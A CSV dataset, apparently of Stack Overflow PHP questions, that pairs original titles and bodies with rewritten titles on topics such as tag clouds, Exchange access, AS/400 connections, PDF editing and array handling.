originalTitle,body,reformulatedTitle
best way to generat a tag cloud from an array? using h1 through h6 for sizing," I have the following arrays: I want to generate a tag cloud that will have artists with a higher number in $count enclosed in h6 tags and the lowest enclosed h1 tags. <code>  $artist = array(""the roots"", ""michael jackson"", ""billy idol"", ""more"", ""and more"", ""and_YET_MORE"");$count = array(5, 3, 9, 1, 1, 3);",What's the best way to generate a tag cloud from an array using h1 through h6 for sizing?
best way to generate a tag cloud from an array? using h1 through h6 for sizing," I have the following arrays: I want to generate a tag cloud that will have artists with a higher number in $count enclosed in h6 tags and the lowest enclosed h1 tags. <code>  $artist = array(""the roots"", ""michael jackson"", ""billy idol"", ""more"", ""and more"", ""and_YET_MORE"");$count = array(5, 3, 9, 1, 1, 3);",What's the best way to generate a tag cloud from an array using h1 through h6 for sizing?
What's the best way to generate a tag cloud from an array? (using h1 through h6 for sizing)," I have the following arrays: I want to generate a tag cloud that will have artists with a higher number in $count enclosed in h6 tags and the lowest enclosed h1 tags. <code>  $artist = array(""the roots"", ""michael jackson"", ""billy idol"", ""more"", ""and more"", ""and_YET_MORE"");$count = array(5, 3, 9, 1, 1, 3);",What's the best way to generate a tag cloud from an array using h1 through h6 for sizing?
Best way to access Exchange using PHP," I'm writing a CMS application in PHP and one of the requirements is that it must be able to interface with the customer's Exchange server. I've written up this functionality a few times before and have always used WebDAV to do it, but now I'm leaning away from that.I will be running the site on IIS OR Apache (no preference) on Windows server 2008. A few things I would need to do include adding contacts to a given user's address book, sending emails as a given user and running reports on contacts for a user.All of this is pretty easy to do with WebDAV, but if there is a better way that doesn't require any functionality that is likely to be deprecated any time soon.Any ideas?Update:Justin, I love the idea of using com objects, I just worry about maintaining a 3rd product to make everything work...John, I can write a web service in C# to interface with for these functions and access it with my PHP app, but it's also a little bit out of the way.So far, I'm not 100% convinced that either of these is better than WebDAV...Can anyone show me where I'm being silly? <code> ",Best way to access Exchange using PHP?
Best way to access Exchange using PHP ?," I'm writing a CMS application in PHP and one of the requirements is that it must be able to interface with the customer's Exchange server. I've written up this functionality a few times before and have always used WebDAV to do it, but now I'm leaning away from that.I will be running the site on IIS OR Apache (no preference) on Windows server 2008. A few things I would need to do include adding contacts to a given user's address book, sending emails as a given user and running reports on contacts for a user.All of this is pretty easy to do with WebDAV, but if there is a better way that doesn't require any functionality that is likely to be deprecated any time soon.Any ideas?Update:Justin, I love the idea of using com objects, I just worry about maintaining a 3rd product to make everything work...John, I can write a web service in C# to interface with for these functions and access it with my PHP app, but it's also a little bit out of the way.So far, I'm not 100% convinced that either of these is better than WebDAV...Can anyone show me where I'm being silly? <code> ",Best way to access Exchange using PHP?
Connect PHP to an AS/400," I've got an upcoming project wherein I will need to connect our website (PHP5/Apache 1.3/OpenBSD 4.1) to our back-end system running on an iSeries with OS400 V5R3 so that I can access some tables stored there. I've done some checking around but am running into some roadblocks.From what I've seen the DB2 extensions and DB2 software from IBM only run under Linux. I've tried compiling the extensions with all the software from IBM and even tried their precompiled ibm_db2 extension with no luck. IBM only supports Linux so I turned on the Linux emulation in the kernel but that didn't seem to help anything.If anyone has run across getting everything to run natively under OpenBSD that would be great, but what I think I may have to do is setting up a second server running CentOS with DB2 installed (most likely via ZendCore for IBM since it seems to do all this for me) and the driver so that I can set up a small transaction server that I can post against and get a JSON representation of the DB2 data that I need.Does the second option seem overkill or does anyone else have any better ideas? <code> ",Connect PHP to IBM i (AS/400)
PDF Editing in PHP?," Does anyone know of a good method for editing PDFs in PHP? Preferably open-source/zero-license cost methods. :)I am thinking along the lines of opening a PDF file, replacing text in the PDF and then writing out the modified version of the PDF?On the front-end <code> ",Edit PDF en PHP?
dition PDF en PHP?," Does anyone know of a good method for editing PDFs in PHP? Preferably open-source/zero-license cost methods. :)I am thinking along the lines of opening a PDF file, replacing text in the PDF and then writing out the modified version of the PDF?On the front-end <code> ",Edit PDF en PHP?
php: access array value on the fly," In php, I often need to map a variable using an array ... but I can not seem to be able to do this in a one liner. c.f. example: This is a minor problem, but it keeps bugging every once in a while ... I don't like the fact, that I use a variable for nothing ;) <code>  // the following results in an error:echo array('a','b','c')[$key];// this works, using an unnecessary variable:$variable = array('a','b','c');echo $variable[$key];",PHP: Access Array Value on the Fly
foreach access the index or an assocative array," I have the following code snippet. Expected output: Is there a way to leave out the $index variable? <code>  $items['A'] = ""Test"";$items['B'] = ""Test"";$items['C'] = ""Test"";$items['D'] = ""Test"";$index = 0;foreach($items as $key => $value){ echo ""$index is a $key containing $value\n""; $index++;} 0 is a A containing Test1 is a B containing Test2 is a C containing Test3 is a D containing Test",foreach access the index or an associative array
